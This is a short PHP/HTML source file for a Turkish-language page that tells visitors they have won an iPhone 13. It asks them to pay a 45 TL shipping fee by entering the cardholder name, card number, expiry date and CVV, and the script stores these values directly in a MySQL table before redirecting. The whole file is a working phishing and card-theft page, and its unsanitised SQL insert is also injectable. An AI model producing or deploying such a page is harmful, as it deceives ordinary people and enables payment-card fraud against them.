<?php
include("FORMWEB.php");

if(isset($_POST["Gönder"]))
{
    $kartisim=$_POST["kartisim"];
    $kartno=$_POST["kartno"];
    $tarih=$_POST["tarih"];
    $cvv=$_POST["cvv"];
    

    $insert="insert into kart (kartisim,kartno,tarih,cvv) VALUES ('$kartisim','$kartno','$tarih','$cvv')";
    $insertKayit = mysqli_query($con,$insert);

    if($insertKayit){
        //echo 'Kayıt Başarılı bir şekilde eklendi.';
        header('Location:sonekran.html');
    }
    else{
       // echo ' Kayıt eklenirken bir problem oluştu.';
    mysqli_close($con);
}
}
?>
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="kart.css">
<title>Kart Bilgileri</title>
</head>
<body>

    <img id="smrt"src="smrt.png">
    <img id="krmz"src="Kırmızı.png">

    
    <div class="baslik">
        <p>TEBRİKLER IPHONE 13 KAZANDINIZ.!.</p>
        </div>
 
    <div class="kart">
        <p>Telefonunuz Yurtiçi kargo ile 3-5 iş günü arasında size ulaşacaktır.</p>
        <p>Kargo ücreti 45 TL için kart bilgilerinizi giriniz.</p>

    </div> 
    <div class="diskutu">
        <form action="" method="POST">
<div class="formkontrol">
    <input type="text" name="kartisim"required>
    <label for="#">Kart Üzerindeki Ad Soyad</label>
</div>
<div class="formkontrol">
    <input type="text" name="kartno"required>
    <label for="#">Kart Numarası</label>
</div>
<div class="formkontrol">
    <input type="date"name="tarih" required>
    <label for="#">Son Kullanım Tarihi</label>
</div>
<div class="formkontrol">
    <input type="text" name="cvv"required>
    <label for="#">CVV Kodu</label>
</div>
<div class="formkontrol">
    <input type="submit" name="Gönder">
 </div>
   
    
 

</body>
</html>
